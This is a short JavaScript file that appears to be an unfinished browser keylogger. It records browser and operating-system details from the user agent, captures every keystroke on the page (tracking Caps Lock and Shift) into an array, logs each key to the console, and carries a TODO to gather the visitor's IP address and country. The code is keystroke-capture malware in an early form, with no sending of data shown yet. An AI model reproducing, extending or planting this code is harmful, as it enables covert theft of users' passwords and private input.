let userAgent = window.navigator.userAgent.split(';')
var basicInfo = {
	'app':userAgent[0],
	'Browser':userAgent[userAgent.length-1],
	'OsName':userAgent[1],
	'OsVersion':userAgent[2],
	'resolution':`${window.outerWidth} x ${window.outerHeight}`,
	//'location':window.navigator.geolocation.getCurrentPosition((pos)=>{return pos}),
	'JavaEnabled':window.navigator.javaEnabled
}

var keyStrokes = [];
var cap = 0

document.addEventListener('keydown',stokeDetect);

function stokeDetect(e){
	let key = ''
	if(e.keyCode == 20){
 		cap++
 		key = cap % 2 == 1?'[CAPS LOCK ON]':'[CAPS LOCK OFF]'
 	}else{
 		key = e.key
	}
		keyStrokes.push(key)
		console.log('key pressed: '+key)
}
document.addEventListener('keyup',holdDetect);
 function holdDetect(e) {
 	if (e.keyCode == 16) {
 		keyStrokes.push('[/SHIFT]')
 		console.log('[/SHIFT]')

 	}
 }

 /*TODO list
 **
 ** Get the Ip & country Data
 **
 **
 **
 */


